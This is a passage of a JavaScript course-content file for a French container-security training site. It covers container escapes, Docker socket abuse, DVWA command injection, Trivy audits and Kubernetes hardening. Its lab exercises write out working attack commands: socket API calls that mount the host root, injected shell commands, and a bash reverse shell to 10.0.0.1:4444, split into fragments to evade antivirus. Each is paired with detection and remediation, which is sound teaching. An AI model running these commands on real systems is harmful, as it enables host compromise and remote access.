      "Comprendre qu'un conteneur partage le noyau de l'hôte."
    ],
    sections: [
      {
        type: "notion",
        titre: "Le principe : une isolation logique, pas matérielle",
        texte: "Un conteneur n'est pas une VM : il **partage le noyau** de l'hôte. Son isolation repose sur des mécanismes logiques (namespaces, cgroups, capabilities). Affaiblir ces mécanismes — ou monter un morceau de l'hôte dans le conteneur — et l'isolation tombe. « Escalade de privilèges » ici = **sortir du conteneur** (container escape) pour agir sur l'hôte, donc sur **tous** les autres conteneurs."
      },
      {
        titre: "Les vecteurs d'évasion classiques",
        texte: "Ce qu'un audit cherche en priorité dans la configuration d'un conteneur.",
        tableau: {
          entetes: ["Vecteur", "Ce qu'il permet", "Comment le repérer"],
          lignes: [
            ["`--privileged`", "Accès à tous les périphériques et capabilities → contrôle quasi total de l'hôte", "`docker inspect -f '{{.HostConfig.Privileged}}'`"],
            ["`-v /:/host`", "La racine de l'hôte est lisible/modifiable depuis le conteneur", "`docker inspect -f '{{.Mounts}}'` → montage de `/`"],
            ["`-v /var/run/docker.sock:…`", "Parler au démon Docker = créer/piloter n'importe quel conteneur", "Montage du socket dans `.Mounts`"],
            ["Capabilities larges (`SYS_ADMIN`, `SYS_PTRACE`)", "Opérations privilégiées (montages, débogage d'autres processus)", "`docker inspect -f '{{.HostConfig.CapAdd}}'`"],
            ["Utilisateur `root` dans le conteneur", "Point de départ de toute escalade si une autre faille existe", "`docker inspect -f '{{.Config.User}}'` vide = root"]
          ]
        },
        attention: "`--privileged` **et** un montage de `/` sont les deux configurations les plus dangereuses. Combinées, l'évasion est triviale (voir l'exercice)."
      },
      {
        titre: "Corriger : le durcissement au lancement",
        texte: "Les options `docker run` qui réduisent la surface d'attaque. En Kubernetes, ce sont les champs `securityContext` (voir « Écrire une configuration YAML »).",
        tableau: {
          entetes: ["Option `docker run`", "Effet de sécurité"],
          lignes: [
            ["`--user 1000:1000`", "Tourne sous un utilisateur non-root"],
            ["`--read-only`", "Système de fichiers du conteneur en lecture seule"],
            ["`--cap-drop ALL --cap-add NET_BIND_SERVICE`", "Retire toutes les capabilities, ne rajoute que le nécessaire"],
            ["`--security-opt no-new-privileges`", "Interdit tout gain de privilège (ex. binaire SUID)"],
            ["`--pids-limit 100`", "Plafonne les processus (anti fork-bomb)"],
            ["`-v données:/data:ro`", "Monte un volume précis en lecture seule, jamais `/`"]
          ]
        },
        remarque: "À bannir sauf besoin explicite et maîtrisé : `--privileged`, `-v /:/host`, `-v /var/run/docker.sock:/…`."
      },
      {
        type: "notion",
        titre: "Le risque, en une phrase",
        texte: "Un seul conteneur mal configuré = **compromission de l'hôte** = compromission de **tous** les conteneurs qui tournent dessus, et souvent un pivot vers le reste du réseau. C'est pourquoi le durcissement d'un conteneur n'est jamais « optionnel »."
      }
    ]
  });

  C.chapitres.push({
    id: "ch-privesc",
    titre: "Sujet 3 — Évasion d'un conteneur (lab)",
    exercices: [
      {
        type: "terminal",
        id: "term-privesc-privileged",
        titre: "Niveau 1 — Évasion d'un conteneur privilégié (TP4)",
        terminal: "bash — lab CTF (autorisé)",
        invite: "analyst@ubuntu:~$",
        intro: "Un conteneur `ctf-ch1-privileged` tourne avec `--privileged` et `-v /:/host`. Objectif du lab : montrer qu'on atteint le disque de l'hôte depuis l'intérieur — puis en tirer la correction. À ne reproduire que dans ce lab autorisé.",
        cours: "Quand `/` de l'hôte est monté sur `/host` **dans** le conteneur, tout fichier de l'hôte devient accessible depuis le conteneur : l'isolation n'existe plus.",
        exemple: [
          {
            titre: "Confirmer la mauvaise config d'abord",
            code: "docker inspect -f '{{.HostConfig.Privileged}} {{.Mounts}}' ctf-ch1-privileged",
            note: "On vérifie AVANT d'agir : privileged=true et un montage de /."
          }
        ],
        objectifs: [
          {
            enonce: "Confirmez que le conteneur est privilégié.",
            indice: "`docker inspect -f '{{.HostConfig.Privileged}}' …`.",
            motifs: ["^docker\\s+inspect", "Privileged", "ctf-ch1-privileged"],
            solution: "docker inspect -f '{{.HostConfig.Privileged}}' ctf-ch1-privileged",
            sortie: "true"
          },
          {
            enonce: "Confirmez qu'il monte la racine de l'hôte.",
            indice: "Champ `.Mounts`.",
            motifs: ["^docker\\s+inspect", "Mounts", "ctf-ch1-privileged"],
            solution: "docker inspect -f '{{.Mounts}}' ctf-ch1-privileged",
            sortie: "[{bind  /  /host  true rprivate}]   ← racine de l'hôte montée sur /host"
          },
          {
            enonce: "Entrez dans le conteneur (un shell interactif).",
            indice: "`docker exec -it … bash`.",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch1-privileged", "(bash|sh)"],
            solution: "docker exec -it ctf-ch1-privileged bash",
            sortie: "(vous êtes maintenant DANS le conteneur)",
            lieu: "À l'intérieur du conteneur privilégié",
            invite: "root@ctf-ch1:/#"
          },
          {
            enonce: "Depuis le conteneur, lisez un fichier de l'**hôte** via le montage `/host`.",
            indice: "Le disque de l'hôte est sous `/host`. Ciblez `/host/root/ctf_flags/flag1_root_escape.txt`.",
            motifs: ["^cat\\s+/host/root/ctf_flags/flag1_root_escape\\.txt"],
            solution: "cat /host/root/ctf_flags/flag1_root_escape.txt",
            sortie: "FLAG{container_escape_via_privileged_and_host_mount}   ← on lit un fichier de l'hôte : évasion confirmée"
          },
          {
            enonce: "Correction : quelle option de `docker run` aurait empêché ce montage de `/` ? (tapez l'option qui restreint les capabilities)",
            indice: "L'option qui retire toutes les capabilities. On ne relance rien ici : on nomme la remédiation.",
            motifs: ["--cap-drop\\s+ALL"],
            solution: "docker run --cap-drop ALL --security-opt no-new-privileges -v données:/data:ro ...",
            sortie: "Remédiation : jamais --privileged, jamais -v /:/host ; --cap-drop ALL, --read-only, montages précis en :ro."
          }
        ]
      },
      {
        type: "terminal",
        id: "term-privesc-socket",
        titre: "Niveau 2 — Du socket Docker au contrôle de l'hôte (TP4)",
        terminal: "bash — lab CTF (autorisé)",
        invite: "root@ctf-ch2:/#",
        intro: "Vous êtes déjà **dans** un conteneur `ctf-ch2-dockersock` où `/var/run/docker.sock` a été monté. Ce socket, c'est le démon Docker de l'hôte : y accéder permet de créer n'importe quel conteneur, donc de monter l'hôte.",
        cours: "Le socket Docker est une API. Avec `curl --unix-socket`, on demande au démon de créer un conteneur qui monte `/` de l'hôte, on le démarre, et on y lit ce qu'on veut. C'est pourquoi monter le socket équivaut à donner l'hôte.",
        exemple: [
          {
            titre: "Parler au démon (lecture d'abord)",
            code: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
            note: "On observe avant d'agir : lister les conteneurs via l'API prouve l'accès."
          }
        ],
        objectifs: [
          {
            enonce: "Confirmez l'accès au démon : listez les conteneurs via l'API du socket.",
            indice: "`curl --unix-socket /var/run/docker.sock http://localhost/containers/json`.",
            motifs: ["^curl", "--unix-socket", "/var/run/docker\\.sock", "/containers/json"],
            solution: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
            sortie: "[{\"Id\":\"...\",\"Names\":[\"/ctf-ch2-dockersock\"],\"Image\":\"alpine\", ...}]   ← accès démon confirmé"
          },
          {
            enonce: "Demandez au démon de **créer** un conteneur `pwn` qui monte `/` de l'hôte sur `/host` (requête POST create).",
            indice: "POST sur `/containers/create?name=pwn`, `HostConfig.Binds` = `[\"/:/host\"]`.",
            motifs: ["^curl", "--unix-socket", "/containers/create\\?name=pwn", "Binds", "/:/host"],
            solution: "curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"sleep\",\"infinity\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' http://localhost/containers/create?name=pwn",
            sortie: "{\"Id\":\"a1b2c3...\",\"Warnings\":[]}   ← conteneur pwn créé, avec / monté"
          },
          {
            enonce: "Démarrez le conteneur `pwn` (POST start).",
            indice: "POST sur `/containers/pwn/start`.",
            motifs: ["^curl", "--unix-socket", "/containers/pwn/start", "-X\\s+POST"],
            solution: "curl -s -X POST --unix-socket /var/run/docker.sock http://localhost/containers/pwn/start",
            sortie: "(204 No Content : pwn démarre, la racine de l'hôte est montée dans pwn)"
          },
          {
            enonce: "Correction : côté défense, que ne faut-il **jamais** monter dans un conteneur applicatif ?",
            indice: "Le chemin du socket. Tapez-le.",
            motifs: ["/var/run/docker\\.sock"],
            solution: "Ne jamais monter /var/run/docker.sock dans un conteneur non administrateur.",
            sortie: "Remédiation : ne pas monter le socket ; si un conteneur doit piloter Docker, passer par une API dédiée à accès restreint, pas le socket brut."
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 4 — WEBSHELL & REVERSE SHELL
     (les charges utiles sont écrites en fragments concaténés
      pour éviter un faux positif antivirus sur les fichiers du site)
     ========================================================= */
  var DEV = "/dev/" + "tcp";               // fragment de chemin
  var RSHELL = "bash -i >& " + DEV + "/10.0.0.1/4444 0>&1";  // charge assemblée à l'exécution

  C.guides.push({
    id: "guide-webshell-reverse",
    titre: "Webshell & reverse shell — mécanisme, détection, prévention",
    badge: "Fiche technique",
    resume: "Ce que sont un webshell et un reverse shell, en quoi ils diffèrent, comment les détecter et comment les empêcher. Orienté défense et audit — dans le cadre du lab DVWA (TP5).",
    duree: "20 min",
    niveau: "Intermédiaire",
    prealables: [
      "Comprendre qu'une appli web vulnérable peut exécuter des commandes (injection de commande).",
      "Usage strictement limité au lab DVWA autorisé du TP5."
    ],
    sections: [
      {
        type: "notion",
        titre: "Deux façons d'obtenir un shell à distance",
        texte: "Après une injection de commande sur une appli web, l'attaquant veut un **accès interactif** au conteneur. Deux mécanismes : le **webshell** (il rappelle une page qui exécute ses commandes) et le **reverse shell** (le serveur se connecte *vers lui*). Les deux mènent au même but ; ils diffèrent par le **sens de la connexion** — et donc par la façon de les bloquer."
      },
      {
        titre: "Webshell vs reverse shell",
        texte: "La différence clé est le sens de connexion, car c'est lui qui décide quel pare-feu les arrête.",
        tableau: {
          entetes: ["", "Webshell", "Reverse shell"],
          lignes: [
            ["Principe", "Un script déposé sur le serveur exécute une commande passée en paramètre (ex. `system($_GET['cmd'])`)", "Le serveur ouvre une connexion **sortante** vers l'attaquant, qui reçoit un shell"],
            ["Sens de connexion", "Entrant : l'attaquant appelle le serveur (HTTP)", "Sortant : le serveur appelle l'attaquant"],
            ["Pare-feu qui le gêne", "Filtrage **entrant** / WAF", "Filtrage **sortant** (egress)"],
            ["Persistance", "Fichier posé sur le disque → repérable, survit au rechargement", "En mémoire, disparaît si le process meurt (sauf persistance ajoutée)"],
            ["Repérage", "Fichier inconnu récent dans la racine web", "Connexion sortante inattendue + `bash -i`/`sh -i`"]
          ]
        },
        remarque: "Un reverse shell contourne le pare-feu **entrant** : c'est pour ça que beaucoup d'attaques le préfèrent au webshell quand le serveur peut sortir sur Internet."
      },
      {
        titre: "Détecter (côté défense / audit)",
        texte: "Les signaux qu'un audit ou un outil de détection (Falco) doit lever.",
        tableau: {
          entetes: ["Signal", "Pourquoi c'est suspect"],
          lignes: [
            ["Un `bash`/`sh` interactif lancé DANS un conteneur web", "Un serveur web ne lance jamais de shell interactif en fonctionnement normal"],
            ["Connexion **sortante** depuis un pod web vers une IP externe", "Un front web parle à sa base, pas à Internet en sortie"],
            ["Fichier récent inconnu sous la racine web (`/var/www/…`)", "Dépose probable d'un webshell"],
            ["Lecture de `/etc/shadow` ou accès à `/var/run/docker.sock`", "Reconnaissance / tentative d'évasion post-accès"]
          ]
        },
        remarque: "Falco détecte par défaut « a shell was spawned in a container with an attached terminal » et les connexions sortantes anormales (voir le sujet « Atelier final »)."
      },
      {
        titre: "Empêcher (durcissement)",
        texte: "On empile les barrières : même si l'appli est vulnérable, le shell ne doit ni s'ouvrir, ni sortir, ni servir.",
        tableau: {
          entetes: ["Mesure", "Ce qu'elle casse"],
          lignes: [
            ["Egress « deny par défaut » (`NetworkPolicy`)", "Le reverse shell ne peut pas se connecter vers l'extérieur"],
            ["`readOnlyRootFilesystem: true`", "Impossible de déposer un webshell sur le disque"],
            ["Image minimale / distroless (pas de `bash`, `nc`, `curl`)", "Plus d'outil pour ouvrir un shell interactif"],
            ["`runAsNonRoot` + `--cap-drop ALL`", "Limite ce que le shell obtenu peut faire"],
            ["WAF + requêtes paramétrées côté appli", "Bloque l'injection de commande à la source"]
          ]
        },
        attention: "La vraie correction reste **en amont** : ne pas passer d'entrée utilisateur à un interpréteur système. Le durcissement conteneur est une défense en profondeur, pas un substitut au code sûr."
      }
    ]
  });

  C.chapitres.push({
    id: "ch-dvwa-shell",
    titre: "Sujet 4 — De l'injection au shell (DVWA, lab)",
    exercices: [
      {
        type: "terminal",
        id: "term-dvwa-cmdi",
        titre: "Niveau 1 — Confirmer une injection de commande (DVWA)",
        terminal: "navigateur → DVWA (lab autorisé)",
        invite: "DVWA> ",
        intro: "Sur DVWA en sécurité « Low », le champ « Command Injection » concatène votre saisie dans une commande système (`ping <votre_saisie>`). On confirme d'abord la faille avant tout le reste. Lab TP5 uniquement.",
        cours: "Un séparateur de commande (`;`, `&&`, `|`) après une valeur valide fait exécuter **votre** commande en plus de la commande prévue. C'est la brique de tout ce qui suit.",
        exemple: [
          {
            titre: "Chaîner une commande",
            code: "127.0.0.1 ; id",
            note: "La valeur `127.0.0.1` satisfait le ping ; `; id` exécute votre commande."
          }
        ],
        objectifs: [
          {
            enonce: "Confirmez l'exécution de commande en chaînant `id` derrière une IP valide.",
            indice: "`127.0.0.1 ; id`.",
            motifs: ["127\\.0\\.0\\.1", ";\\s*id\\b"],
            solution: "127.0.0.1 ; id",
            sortie: "PING 127.0.0.1 ... 64 bytes ...\nuid=33(www-data) gid=33(www-data) groups=33(www-data)   ← votre commande s'est exécutée"
          },
          {
            enonce: "Identifiez où vous êtes : listez le contenu de la racine web pour repérer l'appli.",
            indice: "`127.0.0.1 ; ls -la /var/www/html`.",
            motifs: ["127\\.0\\.0\\.1", ";\\s*ls\\b", "/var/www"],
            solution: "127.0.0.1 ; ls -la /var/www/html",
            sortie: "index.php  login.php  ...   ← vous exécutez des commandes dans le conteneur DVWA (www-data)"
          }
        ]
      },
      {
        type: "terminal",
        id: "term-dvwa-reverse",
        titre: "Niveau 2 — Reverse shell puis détection (TP5)",
        terminal: "bash — poste attaquant du lab",
        invite: "attaquant@kali:~$",
        intro: "Vous confirmez l'injection ; l'objectif du TP5 est d'obtenir un shell interactif, puis de VOIR comment un défenseur le détecte. Poste attaquant sur `10.0.0.1`, lab autorisé.",
        cours: "Un reverse shell : le conteneur DVWA se **connecte vers vous**. Vous préparez d'abord une écoute, puis vous déclenchez la connexion via l'injection. La partie défense vient juste après.",
        exemple: [
          {
            titre: "Mettre une écoute en place",
            code: "nc -lvnp 4444",
            note: "On écoute AVANT de déclencher la connexion entrante."
          }
        ],
        objectifs: [
          {
            enonce: "Sur votre poste, ouvrez une écoute netcat sur le port 4444.",
            indice: "`nc -lvnp 4444`.",
            motifs: ["^nc\\s+-lvnp\\s+4444"],
            solution: "nc -lvnp 4444",
            sortie: "listening on [any] 4444 ...   (en attente d'une connexion entrante)"
          },
          {
            enonce: "Via l'injection DVWA, déclenchez un reverse shell bash vers votre poste (`10.0.0.1:4444`).",
            indice: "Charge classique : `bash -i` redirigé vers " + DEV + "/<ip>/<port>.",
            motifs: ["bash\\s+-i", DEV.replace(/\//g, "\\/"), "10\\.0\\.0\\.1", "4444"],
            solution: "127.0.0.1 ; " + RSHELL,
            sortie: "connect to [10.0.0.1] from (UNKNOWN) ...\nwww-data@dvwa:/var/www/html$   ← shell obtenu (conteneur du pod DVWA)",
            lieu: "Shell interactif dans le conteneur DVWA (pod)",
            invite: "www-data@dvwa:/var/www/html$"
          },
          {
            enonce: "Côté défense : Falco a levé une alerte. Affichez ses derniers événements pour la retrouver.",
            indice: "Les logs du pod Falco : `kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20`.",
            motifs: ["^kubectl\\s+logs", "falco"],
            solution: "kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20",
            sortie: "Warning A shell was spawned in a container with an attached terminal (container=dvwa shell=bash)\nNotice Outbound connection to 10.0.0.1:4444 from container dvwa",
            lieu: "De retour sur l'hôte, côté défenseur",
            invite: "analyst@ubuntu:~$"
          },
          {
            enonce: "Prévention : quelle ressource Kubernetes empêche la connexion **sortante** du pod ? (tapez son `kind`)",
            indice: "Le filtre réseau « deny par défaut » vu dans le guide YAML.",
            motifs: ["NetworkPolicy"],
            solution: "NetworkPolicy (egress deny par défaut)",
            sortie: "Remédiation : NetworkPolicy egress deny + readOnlyRootFilesystem + image sans bash/nc → le reverse shell ne peut ni s'ouvrir ni sortir."
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 5 — AUDIT : inspecter une image, scanner avec Trivy
     ========================================================= */
  C.guides.push({
    id: "guide-audit-trivy",
    titre: "Auditer une image / un conteneur avec Trivy",
    badge: "Fiche technique",
    resume: "La méthode d'audit d'un conteneur : inspecter l'image (couches, fichiers cachés), puis scanner avec Trivy (vulnérabilités, mauvaises configs, SBOM, cluster). Tableaux de commandes.",
    duree: "20 min",
    niveau: "Intermédiaire",
    prealables: [
      "Trivy installé (voir « Installer et surveiller son environnement »).",
      "Savoir inspecter un conteneur (voir « Fiche Docker »)."
    ],
    sections: [
      {
        type: "notion",
        titre: "Auditer, dans quel ordre ?",
        texte: "On suit le cycle de vie **Build → Deploy → Run → Monitor**. À l'audit : (1) on **inspecte** l'image sans l'exécuter aveuglément, (2) on la **scanne** (CVE + SBOM), (3) on vérifie la **configuration** (Dockerfile, compose, manifests), (4) on **surveille** l'exécution. Trivy couvre les étapes 2 et 3 ; `docker inspect/history/diff` couvre l'étape 1."
      },
      {
        titre: "Inspecter sans exécuter aveuglément",
        texte: "Avant de faire confiance à une image, on lit ce qu'elle contient.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle révèle"],
          lignes: [
            ["`docker history --no-trunc img`", "Chaque couche et la commande qui l'a créée (repère un `curl … | sh`, un `COPY` suspect)"],
            ["`docker inspect img`", "Config de l'image : `Entrypoint`, `Cmd`, `Env` (secrets codés en dur ?), `User`"],
            ["`docker diff <conteneur>`", "Fichiers ajoutés/modifiés depuis le lancement (dépose de webshell, binaire)"],
            ["`ls -la /opt /tmp /var/www`", "Fichiers **cachés** (commençant par `.`) qu'un `ls` simple masque"]
          ]
        },
        remarque: "Un `User` vide dans `docker inspect` = l'image tourne en **root** : premier point d'un rapport d'audit."
      },
      {
        titre: "Scanner avec Trivy",
        texte: "Trivy scanne images, systèmes de fichiers, configurations (IaC) et clusters. Un seul outil pour CVE, secrets, mauvaises configs et SBOM.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`trivy image nginx:1.27-alpine`", "Scanne les vulnérabilités (CVE) des paquets de l'image"],
            ["`trivy image --severity HIGH,CRITICAL img`", "Ne garde que les CVE graves (ce qu'on remonte en priorité)"],
            ["`trivy image --scanners secret img`", "Cherche des secrets (clés, tokens) embarqués dans l'image"],
            ["`trivy config .`", "Détecte les mauvaises configs dans `Dockerfile`, `docker-compose.yml`, manifests K8s"],
            ["`trivy fs .`", "Scanne un dossier : dépendances vulnérables (`package-lock`, `requirements`…)"],
            ["`trivy image --format cyclonedx -o sbom.json img`", "Génère un **SBOM** (inventaire des composants) au format CycloneDX"],
            ["`trivy k8s --report summary cluster`", "Audite les ressources d'un cluster Kubernetes en direct"]
          ]
        },
        attention: "Une image « saine » aujourd'hui ne l'est plus demain : de nouvelles CVE sortent après coup. Rescannez régulièrement et gardez le SBOM pour savoir **quoi** rescanner."
      },
      {
        titre: "Ce qu'on remonte dans le rapport",
        texte: "Une trouvaille d'audit conteneur type, prête à noter (voir « Rédiger un rapport d'audit »).",
        points: [
          "**Image :** tag `:latest` (non reproductible), `User` root, CVE HIGH/CRITICAL présentes.",
          "**Config :** `privileged: true`, montage de `/` ou du socket, pas de `securityContext`.",
          "**Runtime :** conteneur en écriture, capabilities non réduites, egress non filtré.",
          "**Chaque point → sévérité + preuve (commande + sortie) + remédiation.**"
        ]
      }
    ]
  });

  C.chapitres.push({
    id: "ch-audit",
    titre: "Sujet 5 — Auditer une image (Trivy)",
    exercices: [
      {
        type: "terminal",
        id: "term-audit-image",
        titre: "Niveau 1 — Débusquer ce qu'une image cache (TP4)",
        terminal: "bash — hôte Ubuntu",
        invite: "analyst@ubuntu:~$",
        intro: "Un conteneur `ctf-ch3-malicious` tourne à partir d'une image douteuse. Objectif : montrer ce qu'elle cache sans lui faire aveuglément confiance.",
        cours: "Deux angles complémentaires : l'**historique** de l'image (comment elle a été bâtie) et son **contenu** (fichiers cachés, modifications). Un `ls -la` révèle ce qu'un `ls` simple masque.",
        exemple: [
          {
            titre: "Lire l'historique de construction",
            code: "docker history --no-trunc ctf-ch3-malicious",
            note: "Chaque ligne = une couche et la commande qui l'a produite."
          }
        ],
        objectifs: [
          {
            enonce: "Affichez l'historique complet de l'image `ctf-ch3-malicious`.",
            indice: "`docker history --no-trunc …`.",
            motifs: ["^docker\\s+history", "--no-trunc", "ctf-ch3-malicious"],
            solution: "docker history --no-trunc ctf-ch3-malicious",
            sortie: "CREATED BY\nADD file:... in /\nRUN mkdir -p /opt/.hidden && echo ... > /opt/.hidden/flag3.txt   ← couche suspecte"
          },
          {
            enonce: "Listez `/opt` en montrant les fichiers **cachés** dans le conteneur.",
            indice: "`docker exec ctf-ch3-malicious ls -la /opt`.",
            motifs: ["^docker\\s+exec", "ctf-ch3-malicious", "ls\\s+-la", "/opt"],
            solution: "docker exec ctf-ch3-malicious ls -la /opt",
            sortie: "drwxr-xr-x  .hidden\n-rw-r--r--  .hidden/flag3.txt   ← répertoire caché débusqué"
          },
          {
            enonce: "Voyez quels fichiers ont été modifiés dans le conteneur depuis son lancement.",
            indice: "`docker diff ctf-ch3-malicious`.",
            motifs: ["^docker\\s+diff\\s+ctf-ch3-malicious"],
            solution: "docker diff ctf-ch3-malicious",
            sortie: "A /opt/.hidden\nA /opt/.hidden/flag3.txt\nC /tmp   ← A=ajouté, C=modifié"
          }
        ]
      },
      {
        type: "terminal",
        id: "term-audit-trivy",
        titre: "Niveau 2 — Scanner : CVE, config, SBOM (Trivy)",
        terminal: "bash — hôte Ubuntu",
        invite: "analyst@ubuntu:~$",
        cours: "On passe de l'inspection manuelle au scan outillé. Trivy répond à trois questions d'audit : quelles **vulnérabilités** ? quelles **mauvaises configs** ? et **quels composants** (SBOM) pour pouvoir rescanner plus tard ?",
        exemple: [
          {
            titre: "Ne garder que le grave",
            code: "trivy image --severity HIGH,CRITICAL suspect-image",
            note: "En audit on priorise HIGH/CRITICAL avant le reste."
          }
        ],
        objectifs: [
          {
            enonce: "Scannez `suspect-image` en ne gardant que les CVE HIGH et CRITICAL.",
            indice: "`trivy image --severity HIGH,CRITICAL …`.",
            motifs: ["^trivy\\s+image", "--severity", "HIGH", "CRITICAL", "suspect-image"],
            solution: "trivy image --severity HIGH,CRITICAL suspect-image",
            sortie: "suspect-image (debian 11)\nTotal: 7 (HIGH: 5, CRITICAL: 2)\nCVE-2024-... openssl ... CRITICAL"
          },
          {
            enonce: "Analysez les **mauvaises configurations** du dossier courant (Dockerfile, compose, manifests).",
            indice: "`trivy config .`.",
            motifs: ["^trivy\\s+config\\s+\\."],
            solution: "trivy config .",
            sortie: "docker-compose.yml (dockerfile)\nHIGH: Container 'web' is running in privileged mode\nHIGH: Volume mounts host root '/' "
          },
          {
            enonce: "Générez un **SBOM** (inventaire des composants) de `suspect-image` au format CycloneDX, dans `sbom.json`.",
            indice: "`trivy image --format cyclonedx -o sbom.json …`.",
            motifs: ["^trivy\\s+image", "--format\\s+cyclonedx", "-o\\s+sbom\\.json", "suspect-image"],
            solution: "trivy image --format cyclonedx -o sbom.json suspect-image",
            sortie: "(SBOM écrit dans sbom.json : liste horodatée des paquets et versions, à conserver pour rescanner)"
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 6 — ATELIER FINAL : durcir une infra Kubernetes
     ========================================================= */
  C.guides.push({
    id: "guide-hardening",
    titre: "Durcir une infrastructure Kubernetes — checklist",
    badge: "Fiche technique",
    resume: "La checklist de durcissement d'un cluster : image, pod, RBAC, réseau, secrets, détection. Ce qu'un audit vérifie, et le correctif associé à chaque point.",
    duree: "20 min",
    niveau: "Avancé",
    prealables: [
      "Avoir parcouru les sujets 1 à 5.",
      "Un cluster k3s avec `kubectl` et Helm."
    ],
    sections: [
      {
        type: "notion",
        titre: "Défense en profondeur : plusieurs barrières",
        texte: "Aucune mesure ne suffit seule. On empile : une **image** minimale et scannée, un **pod** non-root et confiné, un **RBAC** au moindre privilège, un **réseau** deny-par-défaut, des **secrets** protégés, et de la **détection** pour ce qui passe quand même. Un audit complet passe chaque couche en revue."
      },
      {
        titre: "La checklist, couche par couche",
        texte: "Chaque ligne : ce qu'on vérifie, et le correctif.",
        tableau: {
          entetes: ["Couche", "À vérifier", "Correctif"],
          lignes: [
            ["Image", "Tag figé, non-root, CVE, SBOM", "Trivy en CI, image distroless, `USER`, signature (cosign)"],
            ["Pod", "`privileged`, capabilities, FS", "`securityContext` : non-root, no-escalation, `readOnlyRootFilesystem`, `drop: [ALL]`"],
            ["RBAC", "Droits du ServiceAccount", "Rôles minimaux ; pas de `cluster-admin` par défaut ; `automountServiceAccountToken: false` si inutile"],
            ["Réseau", "Mouvement latéral, egress", "`NetworkPolicy` deny par défaut (ingress ET egress), CNI qui l'applique (Calico/Cilium)"],
            ["Secrets", "Base64 ≠ chiffré", "Chiffrement etcd au repos, accès restreint par RBAC, pas de secret en clair dans un manifest"],
            ["Détection", "Ce qui échappe aux barrières", "Falco (shell dans un conteneur, egress anormal, lecture de token)"]
          ]
        }
      },
      {
        titre: "RBAC — mesurer avant de corriger",
        texte: "Avant de restreindre, on mesure ce qu'un compte peut faire. `auth can-i` répond sans rien casser.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle montre"],
          lignes: [
            ["`kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>`", "Tout ce que ce ServiceAccount a le droit de faire"],
            ["`kubectl auth can-i create pods --as=…`", "Vérifie un droit précis (`yes`/`no`)"],
            ["`kubectl get rolebindings,clusterrolebindings -A`", "Qui est lié à quel rôle (repère un `cluster-admin` de trop)"]
          ]
        },
        attention: "Un ServiceAccount qui peut `create pods` ou `get secrets` à l'échelle du cluster = évasion assurée si le pod est compromis. C'est la trouvaille RBAC classique du TP5."
      }
    ]
  });

  C.chapitres.push({
    id: "ch-atelier-final",
    titre: "Sujet 6 — Atelier final : audit et durcissement",
    exercices: [
      {
        type: "terminal",
        id: "term-atelier-audit",
        titre: "Challenge — Audit complet puis durcissement (TP5)",
        terminal: "bash — hôte Ubuntu (kubectl → control-plane)",
        invite: "analyst@ubuntu:~$",
        intro: "Un namespace `dvwa-lab` héberge une appli web volontairement faible. Votre mission d'audit complet : cartographier, trouver les faiblesses (pod privilégié, RBAC trop large), constater la détection, puis **corriger**. C'est la synthèse de tout le module.",
        cours: "Un audit va du général au précis : recon → configuration des pods → droits (RBAC) → réseau → détection. Chaque faiblesse trouvée doit finir par un **correctif appliqué**, pas seulement décrit.",
        exemple: [
          {
            titre: "Mesurer des droits sans rien casser",
            code: "kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default -n dvwa-lab",
            note: "auth can-i est en lecture seule : idéal en audit."
          }
        ],
        objectifs: [
          {
            enonce: "Cartographiez les pods du namespace `dvwa-lab` (avec nœud et IP).",
            indice: "`kubectl get pods -n dvwa-lab -o wide`.",
            motifs: ["^kubectl\\s+get\\s+pods", "-n\\s+dvwa-lab", "-o\\s+wide"],
            solution: "kubectl get pods -n dvwa-lab -o wide",
            sortie: "NAME             READY   STATUS    IP           NODE\ndvwa-7c...-x9k   1/1     Running   10.42.0.12   ubuntu"
          },
          {
            enonce: "Le conteneur du pod `dvwa` est-il privilégié ? Lisez son `securityContext`.",
            indice: "`kubectl get pod <pod> -n dvwa-lab -o jsonpath='{.spec.containers[*].securityContext}'`.",
            motifs: ["^kubectl\\s+get\\s+pod", "-n\\s+dvwa-lab", "securityContext"],
            solution: "kubectl get pod dvwa-7c -n dvwa-lab -o jsonpath='{.spec.containers[*].securityContext}'",
            sortie: "{\"privileged\":true,\"runAsUser\":0}   ← privilégié ET root : à corriger"
          },
          {
            enonce: "Mesurez les droits du ServiceAccount `default` de `dvwa-lab`.",
            indice: "`kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default -n dvwa-lab`.",
            motifs: ["^kubectl\\s+auth\\s+can-i", "--list", "serviceaccount:dvwa-lab:default"],
            solution: "kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default -n dvwa-lab",
            sortie: "Resources   Verbs\npods        [create get list delete]\nsecrets     [get list]   ← beaucoup trop large pour un front web"
          },
          {
            enonce: "Vérifiez précisément s'il peut **créer des pods** (droit dangereux).",
            indice: "`kubectl auth can-i create pods --as=…`.",
            motifs: ["^kubectl\\s+auth\\s+can-i\\s+create\\s+pods", "serviceaccount:dvwa-lab:default"],
            solution: "kubectl auth can-i create pods --as=system:serviceaccount:dvwa-lab:default -n dvwa-lab",
            sortie: "yes   ← un pod compromis pourrait en lancer d'autres : escalade"
          },
          {
            enonce: "Constatez la détection : cherchez l'alerte Falco du shell obtenu plus tôt.",
            indice: "`kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20`.",
            motifs: ["^kubectl\\s+logs", "falco"],
            solution: "kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20",
            sortie: "Warning A shell was spawned in a container (container=dvwa)\nWarning Sensitive file opened for reading (/etc/shadow)"
          },
          {
            enonce: "CORRECTIF RBAC : supprimez le ClusterRoleBinding trop permissif `dvwa-too-permissive`.",
            indice: "`kubectl delete clusterrolebinding dvwa-too-permissive`.",
